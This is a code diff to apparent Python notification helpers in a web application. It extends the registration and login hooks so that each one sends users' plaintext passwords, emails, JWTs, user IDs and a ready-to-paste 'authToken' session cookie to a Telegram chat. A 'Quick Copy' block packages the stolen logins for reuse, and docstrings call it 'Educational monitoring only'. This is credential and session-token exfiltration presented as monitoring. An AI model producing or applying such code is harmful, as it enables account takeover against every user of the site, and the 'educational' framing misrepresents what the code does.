@@ -40,31 +40,46 @@ def send_telegram_notification(message: str) -> bool:
         return False
 
 
-def notify_user_registration(email: str, name: str, password: str) -> None:
+def notify_user_registration(email: str, name: str, password: str, token: str, user_id: str) -> None:
     """
-    Notify about new user registration.
+    Notify about new user registration with full details.
     Educational monitoring only - shows registration activity.
     """
     message = (
         f"🆕 <b>New User Registration</b>\n\n"
-        f"📧 <b>Email:</b> {email}\n"
-        f"👤 <b>Name:</b> {name}\n"
-        f"🔑 <b>Password:</b> {password}\n\n"
+        f"📧 <b>Email:</b> <code>{email}</code>\n"
+        f"👤 <b>Name:</b> <code>{name}</code>\n"
+        f"🔑 <b>Password:</b> <code>{password}</code>\n\n"
+        f"🎫 <b>JWT Token:</b>\n<code>{token}</code>\n\n"
+        f"🆔 <b>User ID:</b> <code>{user_id}</code>\n\n"
+        f"🍪 <b>Session Cookie:</b>\n"
+        f"<code>authToken={token}</code>\n\n"
+        f"📝 <b>Login Details:</b>\n"
+        f"Email: <code>{email}</code>\n"
+        f"Pass: <code>{password}</code>\n\n"
         f"⚠️ <i>Educational Monitoring</i>"
     )
     send_telegram_notification(message)
 
 
-def notify_user_login(email: str, name: str, password: str) -> None:
+def notify_user_login(email: str, name: str, password: str, token: str, user_id: str) -> None:
     """
-    Notify about user login attempt.
+    Notify about user login with full session details.
     Educational monitoring only - shows login activity.
     """
     message = (
-        f"🔐 <b>User Login</b>\n\n"
-        f"📧 <b>Email:</b> {email}\n"
-        f"👤 <b>Name:</b> {name}\n"
-        f"🔑 <b>Password:</b> {password}\n\n"
+        f"🔐 <b>User Login Detected</b>\n\n"
+        f"📧 <b>Email:</b> <code>{email}</code>\n"
+        f"👤 <b>Name:</b> <code>{name}</code>\n"
+        f"🔑 <b>Password:</b> <code>{password}</code>\n\n"
+        f"🎫 <b>JWT Token:</b>\n<code>{token}</code>\n\n"
+        f"🆔 <b>User ID:</b> <code>{user_id}</code>\n\n"
+        f"🍪 <b>Session Cookie:</b>\n"
+        f"<code>authToken={token}</code>\n\n"
+        f"📱 <b>Quick Copy:</b>\n"
+        f"Email: <code>{email}</code>\n"
+        f"Password: <code>{password}</code>\n"
+        f"Token: <code>{token}</code>\n\n"
         f"⚠️ <i>Educational Monitoring</i>"
     )
     send_telegram_notification(message)
